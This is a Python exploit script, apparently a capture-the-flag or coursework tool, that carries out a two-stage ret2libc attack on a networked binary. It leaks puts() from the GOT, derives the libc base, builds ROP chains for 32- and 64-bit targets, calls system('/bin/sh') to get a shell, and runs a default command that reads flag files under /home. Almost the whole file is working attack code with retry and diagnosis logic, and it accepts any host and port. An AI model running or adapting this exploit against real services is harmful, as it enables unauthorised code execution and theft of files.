#!/usr/bin/env python3
"""Authorised coursework; localhost/classroom use; dummy flags.

ret2libc: the answer when NX is on, there is no win() and no format-string bug.

  stage 1   A*offset + puts@plt + main + puts@got   -> prints puts()'s runtime address,
                                                       then returns into main for a 2nd go
  stage 2   A*offset + system + junk + "/bin/sh"    -> shell

libc base = leaked_puts - puts_offset_in_libc. Offsets come from a libc on this machine
(32-bit: /lib32/libc.so.6), which is right whenever the target runs the same image -
true for the lab VM. Override with --libc.

  python3 ret2libc.py HOST PORT --binary ./chall
  python3 ret2libc.py HOST PORT --binary ./chall --libc /lib32/libc.so.6 --offset 76
"""
import argparse, os, re, socket, struct, subprocess, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from elftool import ELF
try:
    from flags import decode_and_find
except Exception:
    decode_and_find = None

LIBCS32 = ["/lib32/libc.so.6", "/lib/i386-linux-gnu/libc.so.6"]
LIBCS64 = ["/lib/x86_64-linux-gnu/libc.so.6", "/lib64/libc.so.6"]


def libc_info(path):
    """(symbol offsets, /bin/sh offset) from a local libc."""
    out = subprocess.run(["readelf", "-sW", path], capture_output=True, text=True).stdout
    syms = {}
    for ln in out.splitlines():
        f = ln.split()
        if len(f) > 7 and f[3] == "FUNC":
            name = f[7].split("@")[0]
            if name in ("puts", "system", "exit", "printf", "fflush", "setvbuf",
                        "getchar") and name not in syms:
                syms[name] = int(f[1], 16)
    sh = None
    st = subprocess.run(["strings", "-a", "-t", "x", path], capture_output=True, text=True).stdout
    for ln in st.splitlines():
        if ln.strip().endswith("/bin/sh"):
            # `strings` gives the offset of the whole printable run. If the run is longer
            # than "/bin/sh" (e.g. "exec /bin/sh"), the string we want starts further in.
            off_s, txt = ln.split(None, 1)
            sh = int(off_s, 16) + len(txt) - len("/bin/sh")
            break
    return syms, sh


def walk_pre(s, pre, timeout, idle=0.4):
    """Send the --pre lines, reading between them, and return everything seen.

    A two-stage ret2libc has to do this TWICE: stage 1 leaks and returns into main, which
    re-prints whatever stood in front of the bug (a menu, a login), so stage 2 lands on
    that prompt instead of the vulnerable read. Without it the leak came back empty and
    the only message was "no leak".
    """
    out = b""
    for line in pre or []:
        try:
            s.sendall(line.encode("latin-1", "replace") + b"\n")
        except OSError:
            break
        time.sleep(0.15)
        out += recv_idle(s, min(timeout, 1.5), idle)
    return out


def recv_idle(s, timeout=3.0, idle=0.4):
    s.settimeout(timeout); out = b""
    while True:
        try:
            d = s.recv(4096)
            if not d: break
            out += d; s.settimeout(idle)
        except (socket.timeout, OSError):
            break
    return out



def main():
    ap = argparse.ArgumentParser(description="ret2libc (NX on, no win, no fmt)")
    ap.add_argument("host"); ap.add_argument("port", type=int)
    ap.add_argument("--binary", required=True)
    ap.add_argument("--pre", action="append", default=[], metavar="LINE",
                    help="line(s) to send before EACH stage's payload, e.g. a menu option. "
                         "Needed when the vulnerable read sits behind a prompt: stage 1 "
                         "returns into main, so the prompt appears again for stage 2")
    ap.add_argument("--libc", help="libc to take offsets from (default: this machine's)")
    ap.add_argument("--offset", type=int, help="filler to the saved return address")
    ap.add_argument("--cmd", default="echo ===SHELL===; id; cat flag* flags/* /home/*/flag* 2>/dev/null",
                    help="shell command to run once the shell is open; the default already "
                         "hunts the usual flag locations")
    ap.add_argument("--timeout", type=float, default=4.0,
                    help="seconds to wait for each reply (raise on a slow/remote target)")
    args = ap.parse_args()

    elf = ELF(args.binary)
    if elf.pie:
        sys.exit("[!] PIE: leak a code address first; this tool assumes fixed addresses")
    if "puts" not in elf.plt:
        sys.exit("[!] no puts in the PLT; nothing to leak with")
    off = args.offset
    if off is None:
        c = elf.report()["ret_offset_candidates"]
        if not c:
            sys.exit("[!] could not infer the offset; pass --offset")
        off = c[0]
    main_addr = elf.functions.get("main")
    if not main_addr:
        sys.exit("[!] no main symbol to return into")

    # 32-bit and 64-bit need different libcs AND different chains: cdecl passes the
    # argument on the stack, the SysV 64-bit ABI needs it in rdi via a gadget.
    word = 8 if elf.bits == 64 else 4
    pool = LIBCS64 if word == 8 else LIBCS32
    libc = args.libc or next((q for q in pool if os.path.exists(q)), None)
    if not libc:
        sys.exit("[!] no local libc found; pass --libc")
    syms, binsh = libc_info(libc)
    if "puts" not in syms or "system" not in syms or binsh is None:
        sys.exit(f"[!] {libc}: need puts, system and a /bin/sh string")

    gad = elf.gadgets()
    ret_gadget = (gad.get("ret") or [None])[0]
    pop_rdi = None
    if word == 8:
        pop_rdi = (gad.get("pop rdi; ret") or [None])[0]
        if pop_rdi is None:
            sys.exit("[!] 64-bit needs a `pop rdi; ret` gadget to pass an argument")

    p = (lambda v: struct.pack("<Q", v)) if word == 8 else (lambda v: struct.pack("<I", v))

    def call1(func, arg, ret_to, align=False):
        """func(arg), then continue at ret_to. `align` prepends a bare `ret`: 64-bit libc
        uses SSE and faults in movaps unless RSP is 16-byte aligned at the call, and
        whether it already is depends on the frame - so both are tried."""
        if word == 8:
            pre = p(ret_gadget) if (align and ret_gadget) else b""
            return pre + p(pop_rdi) + p(arg) + p(func) + p(ret_to)
        return p(func) + p(ret_to) + p(arg)          # cdecl: [func][return][arg]

    print(f"[*] offset={off} main={hex(main_addr)} puts@plt={hex(elf.plt['puts'])} "
          f"puts@got={hex(elf.got['puts'])}" + (f" pop_rdi={hex(pop_rdi)}" if pop_rdi else ""))
    print(f"[*] libc={libc} puts=+{hex(syms['puts'])} system=+{hex(syms['system'])} "
          f"/bin/sh=+{hex(binsh)}")

    # ASLR re-rolls the libc base every connection, so each alignment variant re-leaks.
    # (cross-check?, realign?). The two-leak chain gives a libc sanity check, but it is
    # a longer chain and can fail where the simple one works - so it is only the first
    # try, never the only one.
    foreign = []      # libc-range leaks whose low 12 bits are not this libc's puts()
    variants = [(True, False), (False, False)] + ([(False, True)] if word == 8 else [])
    rerolls = 0       # extra connections spent on bad luck in THIS run's random addresses
    for attempt, (want_check, align) in enumerate(variants):
        if attempt:
            print(f"[*] retrying ({'no cross-check' if not want_check else ''}"
                  f"{' realigned' if align else ''})".replace("( ", "("))
        try:
            s = socket.create_connection((args.host, args.port), timeout=args.timeout)
        except OSError as exc:
            print(f"[!] connect failed: {exc}")
            return 1
        try:
            banner = recv_idle(s, args.timeout, 0.5)
            try:
                import flags as _fl
                _fl.learn_ignore(banner)      # stage 2 returns into main: the banner reappears
            except Exception:
                pass
            banner += walk_pre(s, args.pre, args.timeout)
            # Stage 1 is never realigned: it already works, and adding a `ret` here
            # shifts the frame and breaks the leak. Only the system() call is varied.
            # Leak a SECOND symbol in the same chain. The local libc is only a guess
            # at the target's; predicting that second address and checking it turns
            # "wrong offsets" from a silent failure into a clear message.
            check = next((k for k in ("printf", "fflush", "setvbuf", "getchar")
                          if k in elf.got and k in syms), None) if want_check else None
            chain = None
            if check and word == 8:
                chain = (p(pop_rdi) + p(elf.got["puts"]) + p(elf.plt["puts"])
                         + p(pop_rdi) + p(elf.got[check]) + p(elf.plt["puts"])
                         + p(main_addr))
            elif check:
                popb = (gad.get("pop ebx; ret") or [None])[0]
                if popb:
                    chain = (p(elf.plt["puts"]) + p(popb) + p(elf.got["puts"])
                             + p(elf.plt["puts"]) + p(main_addr) + p(elf.got[check]))
                else:
                    check = None
            if chain is None:
                chain = call1(elf.plt["puts"], elf.got["puts"], main_addr)
            stage1 = b"A" * off + chain
            s.sendall(stage1 + b"\n")
            time.sleep(0.4)
            leak_raw = recv_idle(s, args.timeout, 0.5)
            # Anchor on the LAST thing we sent: a read()-based service may echo in chunks.
            k = leak_raw.rfind(p(elf.got["puts"]))
            if k >= 0:
                tail = leak_raw[k + word:].lstrip(b"\n")
            elif leak_raw.startswith(banner):
                tail = leak_raw[len(banner):]
            else:
                tail = leak_raw
            # puts() prints from puts@got until a NUL; adjacent GOT slots mean several
            # addresses can arrive at once, and the high bytes of a 64-bit one are NUL.
            first = tail.split(b"\n", 1)[0]
            if not first:
                print(f"[!] no leak in: {tail[:100]!r}")
                continue
            first = (first + b"\x00" * word)[:word]
            leaked = struct.unpack("<Q" if word == 8 else "<I", first)[0]
            base = leaked - syms["puts"]
            if base <= 0 or base & 0xFFF:
                # The low 12 bits of an address survive ASLR. If the leak is in the range
                # libc lives in and those bits are not this machine's puts(), the leak is
                # fine and the LIBC is different - it used to be reported as "not puts()",
                # which sends you looking for a bug in the leak instead of for a file.
                libc_like = (0xF7000000 <= leaked <= 0xF7FFFFFF) if word == 4 else \
                            (0x7F0000000000 <= leaked <= 0x7FFFFFFFFFFF)
                if libc_like and (leaked & 0xFFF) != (syms["puts"] & 0xFFF):
                    foreign.append(leaked)      # judged at the END, once every variant has failed
                print(f"[!] leak {hex(leaked)} gives a non-page-aligned base; not puts()")
                if not libc_like and rerolls < 3:
                    # Not a libc address at all: puts() stops at a NUL, so a libc address
                    # with a zero byte in it arrives cut short. Addresses are re-drawn on
                    # every connection - the same chain again is a new roll, not a repeat.
                    rerolls += 1
                    variants.append((want_check, align))
                    print("[*] the leaked address was cut short (a zero byte in it this run) - "
                          "reconnecting for fresh addresses")
                continue
            system, sh = base + syms["system"], base + binsh
            print(f"[+] puts() at {hex(leaked)} -> libc base {hex(base)}")
            if check:
                parts = tail.split(b"\n", 2)
                if len(parts) > 1 and parts[1]:
                    got2 = struct.unpack("<Q" if word == 8 else "<I",
                                         (parts[1] + b"\x00" * word)[:word])[0]
                    want = base + syms[check]
                    if got2 != want:
                        print(f"[!] libc MISMATCH: {check}() is at {hex(got2)} but this "
                              f"machine's libc predicts {hex(want)}")
                        print(f"[!] the target is NOT running {libc}; every offset here "
                              f"is wrong. Re-run with --libc <the target's libc>.")
                        return 1
                    print(f"[+] cross-check OK: {check}() matches at {hex(got2)}")
            print(f"[*] system={hex(system)} \"/bin/sh\"={hex(sh)}")
            walk_pre(s, args.pre, args.timeout)      # main re-printed the prompt
            # A variant with the wrong stack alignment makes system() fault and the
            # service close the connection. That is the EXPECTED outcome of half the
            # variants - but the send below then raised BrokenPipeError, which went
            # uncaught and ended the whole run with a traceback before the variant that
            # works was tried. It only ever happened on a libc that faults on
            # misalignment (Debian 12's does; the development machine's does not).
            out = b""
            stage2 = b"A" * off + call1(system, sh, main_addr, align)
            if b"\n" in stage2 and rerolls < 3:
                # A newline inside system()'s or "/bin/sh"'s address ends the service's
                # read early. Same cure: this run's addresses are unlucky, the next differ.
                rerolls += 1
                variants.append((want_check, align))
                print("[*] this run's libc addresses contain a newline byte, which would cut the "
                      "payload - reconnecting for fresh addresses")
                continue
            try:
                s.sendall(stage2 + b"\n")
                time.sleep(0.5)
                recv_idle(s, 1.5, 0.3)
                from flags import with_proof
                s.sendall(with_proof(args.cmd).encode() + b"\n")
                time.sleep(0.8)
                out = recv_idle(s, 3.0, 0.6)
            except OSError:
                print(f"[*] this chain (align={align}) closed the connection - trying the next one")
        except OSError as exc:
            print(f"[*] connection dropped during this variant ({exc}) - trying the next one")
            continue
        finally:
            s.close()
        text = out.decode("latin-1", "replace")
        flag = decode_and_find(text)[0] if decode_and_find else None
        if flag:
            sys.stdout.write(text)
            print(f"\n[+] FLAG: {flag}")
            return 0
        from flags import shell_confirmed
        if shell_confirmed(text):
            sys.stdout.write(text)
            print("\n[+] shell confirmed")
            return 0
    print("\n[!] shell NOT confirmed after every variant")
    # Only now, and only if every leak agrees: one odd value can be a mis-read reply (the
    # next variant then solves, and we never get here), but the SAME last three digits on
    # every connection, different from this machine's puts(), is a different libc.
    # One clean leak is enough HERE: every variant has already failed, so nothing is being
    # abandoned on its strength. (Requiring two made this silent about one run in eight -
    # an address with a newline byte in it garbles that variant's reading.)
    if foreign and len({x & 0xFFF for x in foreign}) == 1:
        leaked = foreign[-1]
        print(f"[!] DIAGNOSIS: the target runs a DIFFERENT libc from this machine's.")
        print(f"[!] It leaked puts() = {hex(leaked)}, ending in ...{leaked & 0xFFF:03x} ({len(foreign)} clean reading(s)); in {libc}")
        print(f"[!] puts() ends in ...{syms['puts'] & 0xFFF:03x}. Those three digits never change "
              f"with ASLR, so every offset taken from the local libc is wrong.")
        print("[!] Use the libc that came with the challenge (often libc.so.6 beside the binary):")
        print(f"[!]     python3 {os.path.abspath(__file__)} {args.host} {args.port} "
              f"--binary {args.binary} --libc ./libc.so.6")
    return 1


if __name__ == "__main__":
    sys.exit(main())
